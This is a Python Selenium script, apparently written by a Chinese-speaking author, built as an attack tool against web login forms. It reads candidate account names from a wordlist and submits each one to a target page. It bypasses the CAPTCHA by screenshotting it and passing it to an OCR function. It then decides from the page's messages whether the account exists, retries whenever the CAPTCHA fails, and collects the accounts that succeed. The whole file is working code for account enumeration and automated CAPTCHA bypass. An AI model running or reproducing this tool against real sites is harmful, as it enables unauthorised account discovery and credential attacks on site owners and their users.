from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time
import func
import setting

mode = ''
url = ''
input_xpath = ''
input_wordlist = ''
captcha_img_xpath = ''
captcha_input_xpath = ''
enter_xpath = ''

def attack(mode, url, input_xpath, testvalue, captcha_img_xpath, captcha_input_xpath, enter_xpath, success_box_xpath, retry_box_path, success_flag, retry_flag):
  op = webdriver.ChromeOptions()
  op.page_load_strategy = 'normal'
  chrome = webdriver.Chrome(options=op)
  chrome.get(url)

  if(mode == 1):
    imgs = chrome.find_element(By.XPATH, captcha_img_xpath)
    b64 = imgs.screenshot_as_base64
    
    account = chrome.find_element(By.XPATH, input_xpath)
    captcha = chrome.find_element(By.XPATH, captcha_input_xpath)
    submit = chrome.find_element(By.XPATH, enter_xpath)

    account.send_keys(testvalue)
    captcha.send_keys(func.ocr(b64))

    # time.sleep(3)
    submit.click()

    #抓取測試結果
    retry_position = chrome.find_element(By.XPATH, retry_box_path)
    retry_msg = retry_position.text
    if(retry_msg == retry_flag):
      return "R"

    success_position = chrome.find_element(By.XPATH, success_box_xpath)
    success_msg = success_position.text

    if(success_msg == success_flag):
      return "S"
    
    return "F"

  elif(mode == 2):
    print("TODO")

mode = setting.mode_set()
if(mode == 1):

  result = ""
  url, input_xpath, input_wordlist, captcha_img_xpath, captcha_input_xpath, enter_xpath, success_box_xpath, retry_box_path, success_flag, retry_flag = setting.set(mode)
  with open(input_wordlist, mode='r', encoding='UTF-8') as doc:
    testvalue = doc.readline().strip('\n')
    while testvalue is not None and testvalue != '':
      result_flag = attack(mode, url, input_xpath, testvalue, captcha_img_xpath, captcha_input_xpath, enter_xpath, success_box_xpath, retry_box_path, success_flag, retry_flag)
      print("測試值:" + testvalue)
      print("測試結果:" + result_flag)
      if(result_flag == "S"):
        result += (testvalue + "\n")
        print("測試成功，儲存結果！\n")
        testvalue = doc.readline().strip('\n')

      elif(result_flag == "R"):
        print("驗證碼錯誤，重新測試！\n")

      else:
        print("帳號不存在，測試下一筆！\n")
        testvalue = doc.readline().strip('\n')
  
  print("***RESULT***")
  print(result)

elif(mode == 2):
  print("TODO")

